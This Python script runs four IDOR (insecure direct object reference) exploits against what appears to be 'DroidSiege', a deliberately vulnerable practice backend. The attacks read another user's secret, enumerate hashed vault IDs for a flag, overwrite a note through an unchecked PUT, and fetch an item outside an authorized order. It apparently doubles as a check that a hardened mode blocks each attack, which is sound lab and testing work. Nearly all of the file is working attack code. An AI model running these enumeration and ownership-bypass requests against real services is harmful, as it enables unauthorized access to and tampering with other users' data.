#!/usr/bin/env python3
"""DroidSiege — backend/idor exploit script (all four tiers, vuln + hardened).

Usage: python3 idor_attacks.py [base_url]
Default base: http://10.0.2.2:8080 (emulator -> host loopback). For hardened
verification start the backend with SECURE_MODE=on and re-run: every exploit
must FAIL (401/403/429, no flag).
"""
import hashlib, json, sys, urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://10.0.2.2:8080").rstrip("/")

def call(method, path, token=None, body=None):
    req = urllib.request.Request(BASE + path, method=method)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, data=data) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def login(u, p):
    status, body = call("POST", "/api/auth/login", body={"username": u, "password": p})
    assert status == 200, f"login failed: {{status}} {{body}}"
    return json.loads(body)["token"]


def main():
    print("== L1: any id answers (flag lives on system user 5) ==")
    alice = login("alice", "hunter2")
    print(call("GET", "/api/users/5/secret", alice))

    print("== L2: enumerate the hashid space — vault 7 = sha256('siege7')[:8] base32 ==")
    alphabet = "abcdefghijklmnopqrstuvwxyz234567"
    for vid in range(64):
        digest = hashlib.sha256(f"siege{vid}".encode()).digest()
        hid = "".join(alphabet[b & 0x1F] for b in digest[:8])
        status, body = call("GET", f"/api/vaults/{hid}")
        if status == 200 and "DS{" in body:
            print(f"vault {vid} hid={hid} ->", body)
            break

    print("== L3: GET checks ownership, PUT does not ==")
    print(call("PUT", "/api/notes/2", alice, {"note": "hacked"}))

    print("== L4: order authorized, item fetched globally (503 = system order item) ==")
    print(call("GET", "/api/orders/101/items/503", alice))

if __name__ == "__main__":
    main()
